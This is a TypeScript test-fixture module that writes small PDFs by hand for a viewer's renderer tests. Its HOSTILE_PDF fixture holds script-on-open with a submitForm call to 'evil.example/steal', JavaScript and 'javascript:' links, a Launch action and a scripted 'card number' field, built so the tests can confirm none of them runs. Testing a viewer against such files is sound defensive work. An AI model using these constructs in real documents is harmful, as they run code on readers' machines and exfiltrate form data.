/**
 * PDFs for the dev fake (`?fake-binary`) and the PDF renderer's tests (#2260),
 * here rather than under the dev harness so tests import them statically. Only
 * the dev fake imports it, so a release build carries none of it. Written out by
 * hand: a few lines of Helvetica per page, link annotations, and, for the
 * hostile one, every way a PDF asks to run something. ASCII only, so a
 * string's length is its byte length and the cross-reference offsets hold.
 */

/** Where a link goes: a web page, a page of this document (1-based), or a PDF action that must do nothing. */
export type FakeTarget = { uri: string } | { page: number } | { js: string } | { launch: string };

export interface FakeLink {
  /** The link's box in PDF points, `[x1, y1, x2, y2]` from the bottom left of a 612×792 page. */
  rect: [number, number, number, number];
  to: FakeTarget;
}

export interface FakePage {
  lines: string[];
  links?: FakeLink[];
  /** A text field on the page whose keystroke action is JavaScript (a form the viewer must not draw as one). */
  field?: string;
  /** A one-colour image on the page (`rrggbb`, 2×2 pixels drawn 120 pt wide), so a page can change by its image alone. */
  image?: string;
  /** A square annotation that draws itself (its own appearance stream), as a reviewer's mark does. */
  box?: true;
  /** A gradient from this colour (`rrggbb`) to white, a shading pdf.js names per page (`pattern_p0_1`). */
  gradient?: string;
  /** A JPEG 2000 image on the page (`JPX_SQUARES`, a JPX codestream as hex), drawn 120 pt wide: pdf.js decodes it only with `openjpeg.wasm` (#2313). */
  jpx?: string;
}

export interface FakePdfSpec {
  pages: FakePage[];
  /** JavaScript the document asks to run when it opens (`/OpenAction` and the `/JavaScript` name tree). */
  openJs?: string;
}

const escape = (text: string) => text.replace(/[\\()]/g, (c) => `\\${c}`);

function action(to: FakeTarget, pageRef: (n: number) => string): string {
  if ("uri" in to) return `/A << /S /URI /URI (${escape(to.uri)}) >>`;
  if ("page" in to) return `/Dest [${pageRef(to.page)} /XYZ 0 792 0]`;
  if ("js" in to) return `/A << /S /JavaScript /JS (${escape(to.js)}) >>`;
  return `/A << /S /Launch /F (${escape(to.launch)}) >>`;
}

/** A PDF of `spec`'s pages, each 612×792 points (US Letter), its text at 72 pt from the left. */
export function fakePdf(spec: FakePdfSpec): Uint8Array {
  const n = spec.pages.length;
  // 1 catalog, 2 pages, 3 font, then a page and its content per page, then annotations.
  const pageId = (k: number) => 4 + 2 * k;
  const pageRef = (page: number) => `${pageId(page - 1)} 0 R`;
  const objects: string[] = [];
  const extra: string[] = [];
  const add = (body: string) => {
    extra.push(body);
    return 3 + 2 * n + extra.length;
  };
  const fields: number[] = [];
  spec.pages.forEach((page, k) => {
    const annots = (page.links ?? []).map((link) =>
      add(`<< /Type /Annot /Subtype /Link /Rect [${link.rect.join(" ")}] /Border [0 0 0] ${action(link.to, pageRef)} >>`),
    );
    if (page.box) {
      const look = "0 0 1 RG 2 w 1 1 98 48 re S";
      const ap = add(`<< /Type /XObject /Subtype /Form /BBox [0 0 100 50] /Length ${look.length} >>\nstream\n${look}\nendstream`);
      annots.push(add(`<< /Type /Annot /Subtype /Square /Rect [300 500 400 550] /AP << /N ${ap} 0 R >> >>`));
    }
    if (page.field !== undefined) {
      const field = add(
        `<< /Type /Annot /Subtype /Widget /FT /Tx /T (${escape(page.field)}) /V (${escape(page.field)}) /Rect [72 100 300 124] /P ${pageId(k)} 0 R /DA (/F1 12 Tf 0 g) /AA << /K << /S /JavaScript /JS (app.alert\\("field"\\)) >> >> >>`,
      );
      annots.push(field);
      fields.push(field);
    }
    const image =
      page.image === undefined
        ? null
        : add(`<< /Type /XObject /Subtype /Image /Width 2 /Height 2 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /ASCIIHexDecode /Length 25 >>\nstream\n${page.image.repeat(4)}>\nendstream`);
    const jpx =
      page.jpx === undefined
        ? null
        : add(`<< /Type /XObject /Subtype /Image /Width 16 /Height 16 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter [/ASCIIHexDecode /JPXDecode] /Length ${page.jpx.length + 1} >>\nstream\n${page.jpx}>\nendstream`);
    const text =
      page.lines.map((line, i) => `BT /F1 ${i === 0 ? 20 : 12} Tf 72 ${720 - i * 28} Td (${escape(line)}) Tj ET`).join("\n") +
      (image === null ? "" : "\nq 120 0 0 120 72 300 cm /Im1 Do Q") +
      (jpx === null ? "" : "\nq 120 0 0 120 72 300 cm /Jpx1 Do Q");
    const rgb = (hex: string) => [0, 2, 4].map((at) => (parseInt(hex.slice(at, at + 2), 16) / 255).toFixed(3)).join(" ");
    const shading =
      page.gradient === undefined
        ? null
        : add(`<< /ShadingType 2 /ColorSpace /DeviceRGB /Coords [0 0 1 0] /Function << /FunctionType 2 /Domain [0 1] /C0 [${rgb(page.gradient)}] /C1 [1 1 1] /N 1 >> >>`);
    const painted = text + (shading === null ? "" : "\nq 200 0 0 50 72 200 cm /Sh1 sh Q");
    const images = [image === null ? "" : ` /Im1 ${image} 0 R`, jpx === null ? "" : ` /Jpx1 ${jpx} 0 R`].join("");
    const xobject = (images === "" ? "" : ` /XObject <<${images} >>`) + (shading === null ? "" : ` /Shading << /Sh1 ${shading} 0 R >>`);
    objects[pageId(k)] =
      `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >>${xobject} >> /Contents ${pageId(k) + 1} 0 R` +
      (annots.length > 0 ? ` /Annots [${annots.map((a) => `${a} 0 R`).join(" ")}]` : "") +
      " >>";
    objects[pageId(k) + 1] = `<< /Length ${painted.length} >>\nstream\n${painted}\nendstream`;
  });
  const js = spec.openJs === undefined ? "" : `<< /S /JavaScript /JS (${escape(spec.openJs)}) >>`;
  objects[1] =
    "<< /Type /Catalog /Pages 2 0 R" +
    (js === "" ? "" : ` /OpenAction ${js} /Names << /JavaScript << /Names [(open) ${js}] >> >>`) +
    (fields.length > 0 ? ` /AcroForm << /Fields [${fields.map((f) => `${f} 0 R`).join(" ")}] /DA (/F1 12 Tf 0 g) >>` : "") +
    " >>";
  objects[2] = `<< /Type /Pages /Kids [${spec.pages.map((_, k) => `${pageId(k)} 0 R`).join(" ")}] /Count ${n} >>`;
  objects[3] = "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>";
  extra.forEach((body, i) => (objects[4 + 2 * n + i] = body));

  let out = "%PDF-1.7\n";
  const offsets: number[] = [];
  for (let id = 1; id < objects.length; id++) {
    offsets[id] = out.length;
    out += `${id} 0 obj\n${objects[id]}\nendobj\n`;
  }
  const xref = out.length;
  out += `xref\n0 ${objects.length}\n0000000000 65535 f \n`;
  for (let id = 1; id < objects.length; id++) out += `${String(offsets[id]).padStart(10, "0")} 00000 n \n`;
  out += `trailer\n<< /Size ${objects.length} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return new TextEncoder().encode(out);
}

/** `docs/spec.pdf`: three pages, an external link on the first, a link to page 3 on the second. */
export const SPEC_PDF = () =>
  fakePdf({
    pages: [
      {
        lines: ["Payout service: design", "Pays out SEPA batches once a day.", "The PSP's status page: psp.example.com/status"],
        links: [{ rect: [72, 656, 400, 676], to: { uri: "https://psp.example.com/status" } }],
      },
      { lines: ["Retries", "Transient PSP errors are retried five times.", "See page 3 for the backoff."], links: [{ rect: [72, 656, 300, 676], to: { page: 3 } }] },
      { lines: ["Backoff", "Exponential, with jitter, capped at ten minutes."] },
    ],
  });

/**
 * `docs/hostile.pdf`: JavaScript on open, a JavaScript link, a `javascript:` URI, a Launch action and a text field
 * with a keystroke script. Drawn, it is two pages of text and one link that goes to the PSP; nothing else does anything.
 */
export const HOSTILE_PDF = () =>
  fakePdf({
    openJs: 'app.alert("pdf-js-ran"); this.submitForm("https://evil.example/steal");',
    pages: [
      {
        lines: ["A hostile PDF", "It asks to run JavaScript when it opens.", "Run script", "javascript: link", "Launch calc", "The PSP"],
        links: [
          { rect: [72, 636, 300, 652], to: { js: 'app.alert("link-js-ran")' } },
          { rect: [72, 608, 300, 624], to: { uri: "javascript:alert('uri-js-ran')" } },
          { rect: [72, 580, 300, 596], to: { launch: "/System/Applications/Calculator.app" } },
          { rect: [72, 552, 300, 568], to: { uri: "https://psp.example.com/" } },
        ],
        field: "card number",
      },
      { lines: ["Page two", "Nothing here either."] },
    ],
  });

/**
 * A 16×16 JPEG 2000 codestream (`ffmpeg -c:v jpeg2000 -format j2k`, 539 bytes) as hex: four 8×8 squares, green
 * `1f7444` and orange `d4552f` above, blue `2f55d4` and yellow `e8c020` below (#2313).
 */
export const JPX_SQUARES =
  "ff4fff51002f000000000010000000100000000000000000000001000000010000000000000000000003070101070101070101ff52000c" +
  "00000001000602020000ff5c0029227f207ee07ee07ea076f076f076c06f006f006ee067506750676850055005504757d357d35762ff64" +
  "001000014c61766336332e312e313032ff90000a00000000019b0001ff93c7f80308973fc3f90306dcbfc7f803057c7f000000000000cf" +
  "e40e07da05007c804004777f01bf03c03e70300f9c0c3f30200101040bc3f3018fd80a1f981008042005bbc7e60d03ea0580088008241f" +
  "e1637f0e279d3dbf000fc1f682c1f68240fa81400012fc6e3f00135cb4000107369fc3f0068fcc1e07d40a0b0a799c567f07753e1f23aa" +
  "bf09689e291fcfc03a0f9c40172c1e3e97fea610f3e98b3287a30c78438d9ee58d7fc7da1b1f68643ea0701a9cd72316c8454d1b7ae519" +
  "bf202de81fa4c0d3474aaea49f16b10637a15f0ecfc03e7e01d0fa8200191c993d5d34807b90376a1a6d9a4a0c66dfbad01399e9080bca" +
  "6baacd16045835a15d778fc7da2303e416216e070cc0f0fb29227c9e570bb362102900d4c4e8427a0e29bf1abfc3ea1387d42707ce1c4a" +
  "747ffe094eda4ca3055603f332e9fd040b7f29de04bd8ec1e032e3bd72069bf9cd38280f10242c297efeab3fc7da291f688c1f38704b20" +
  "50e049a60cd5365a1efe74021b59835aaf7f00cad2883f5c837466d3ecea7e367e1eaf24dc95c981241fffd9";

/** `docs/scan.pdf`: a page with a JPEG 2000 image and its text in Helvetica, a standard font the PDF does not embed (#2313). */
export const SCAN_PDF = () => fakePdf({ pages: [{ lines: ["A scanned page", "The squares below are a JPEG 2000 image."], jpx: JPX_SQUARES }] });
